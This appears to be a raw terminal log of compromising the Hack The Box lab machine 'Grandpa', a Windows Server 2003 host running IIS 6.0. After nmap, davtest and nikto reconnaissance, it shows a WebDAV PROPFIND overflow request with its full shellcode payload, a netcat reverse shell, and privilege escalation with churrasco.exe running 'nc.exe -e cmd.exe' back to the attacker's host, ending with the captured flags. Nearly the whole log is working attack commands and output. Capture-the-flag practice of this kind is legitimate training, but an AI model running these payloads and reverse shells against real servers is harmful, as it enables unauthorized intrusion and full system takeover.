RECON
root@kali:~/htb/grandpa# nmap -sC -sV -p- -vv -oA full 10.10.10.14
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unkown
|   Server Date: Sun, 08 Nov 2020 12:54:01 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

ENUMERATE WEBDAV
root@kali:~/htb/grandpa# davtest -url http://10.10.10.14 -directory demo_dir -rand aaaa_upfileP0C
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: aaaa_upfileP0C
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	txt	FAIL
PUT	jsp	FAIL
PUT	shtml	FAIL
PUT	jhtml	FAIL
PUT	asp	FAIL
PUT	cgi	FAIL
PUT	html	FAIL
PUT	cfm	FAIL
PUT	aspx	FAIL
PUT	pl	FAIL
PUT	php	FAIL

********************************************************
/usr/bin/davtest Summary:

root@kali:~/htb/grandpa# cadaver 10.10.10.14/webdav
Could not parse URL `10.10.10.14/webdav'
dav:10.10.10.14/webdav? 
dav:10.10.10.14/webdav? ^CTerminated by signal 2.
root@kali:~/htb/grandpa# cadaver 10.10.10.14
dav:/> dir
Unrecognised command. Type 'help' for a list of commands.
dav:/> ls
Listing collection `/': collection is empty.
dav:/> put 

root@kali:~/htb/grandpa# nikto -h http://10.10.10.14
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2020-11-08 08:22:28 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPPATCH PROPFIND COPY LOCK UNLOCK SEARCH MKCOL listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_bin/shtml.exe/_vti_rpc: FrontPage may be installed.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ /_vti_bin/_vti_adm/admin.exe: FrontPage/Sharepointfile available.
+ /_vti_bin/_vti_aut/author.exe: FrontPage/Sharepointfile available.
+ /_vti_bin/_vti_aut/author.dll: FrontPage/Sharepointfile available.
+ 7499 requests: 0 error(s) and 31 item(s) reported on remote host
+ End Time:           2020-11-08 08:25:37 (GMT-5) (189 seconds)


root@kali:~/htb/grandpa# davtest -url http://10.10.10.14/_vti_bin 
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14/_vti_bin
********************************************************
NOTE	Random string for this session: fXUg57HvU
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	shtml	FAIL
PUT	html	FAIL
PUT	aspx	FAIL
PUT	cgi	FAIL
PUT	pl	FAIL
PUT	jhtml	FAIL
PUT	jsp	FAIL
PUT	txt	FAIL
PUT	asp	FAIL
PUT	cfm	FAIL
PUT	php	FAIL

********************************************************
/usr/bin/davtest Summary:

TRIGGER VULNERABILITY
root@kali:~/htb/grandpa# python exploit.py 10.10.10.14 80 10.10.14.8 1234
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

oot@kali:~/htb/grandpa# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.14: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.14] 1040
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

C:\wmpub>whoami/priv
whoami/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 


root@kali:~/htb/grandpa# 
root@kali:~/htb/grandpa# cp /usr/share/windows-binaries/nc.exe .
root@kali:~/htb/grandpa# cp nc.exe nc
root@kali:~/htb/grandpa# vim systeminfo.txt


root@kali:~/htb/grandpa# python /root/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /root/Windows-Exploit-Suggester/2020-11-04-mssb.xls --systeminfo /root/htb/grandpa/systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done

copy \\10.10.14.8\share\churrasco.exe
copy \\10.10.14.8\share\nc.exe

churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.8 443"

GET ROOSHELL
root@kali:~# nc -lvp 443
listening on [any] 443 ...
10.10.10.14: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.14] 1063
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami 
whoami 
nt authority\system


C:\WINDOWS\TEMP>cd C:\Documents and Settings
cd C:\Documents and Settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  04:32 PM    <DIR>          .
04/12/2017  04:32 PM    <DIR>          ..
04/12/2017  04:12 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  04:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)  18,087,837,696 bytes free

C:\Documents and Settings>dir Harry
dir Harry
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Harry

04/12/2017  04:32 PM    <DIR>          .
04/12/2017  04:32 PM    <DIR>          ..
04/12/2017  04:32 PM    <DIR>          Desktop
04/12/2017  04:32 PM    <DIR>          Favorites
04/12/2017  04:32 PM    <DIR>          My Documents
04/12/2017  03:42 PM    <DIR>          Start Menu
04/12/2017  03:44 PM                 0 Sti_Trace.log
               1 File(s)              0 bytes
               6 Dir(s)  18,088,058,880 bytes free

C:\Documents and Settings>dir Harry\Desktop	
dir Harry\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Harry\Desktop

04/12/2017  04:32 PM    <DIR>          .
04/12/2017  04:32 PM    <DIR>          ..
04/12/2017  04:32 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,088,058,880 bytes free

GET USER FLAG
C:\Documents and Settings>type Harry\Desktop\user.txt
type Harry\Desktop\user.txt
#################################
C:\Documents and Settings>dir C:\Administrator\Desktop 
dir C:\Administrator\Desktop
The system cannot find the file specified.

C:\Documents and Settings>dir Administrator\Desktop
dir Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  04:28 PM    <DIR>          .
04/12/2017  04:28 PM    <DIR>          ..
04/12/2017  04:29 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,088,054,784 bytes free

GET ROOT FLAG
C:\Documents and Settings>type Administrator\Destop\root.txt
type Administrator\Destop\root.txt
The system cannot find the path specified.

C:\Documents and Settings>dir Administrator\Desktop\root.txt
dir Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  04:29 PM                32 root.txt
               1 File(s)             32 bytes
               0 Dir(s)  18,088,050,688 bytes free

C:\Documents and Settings>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
########################################
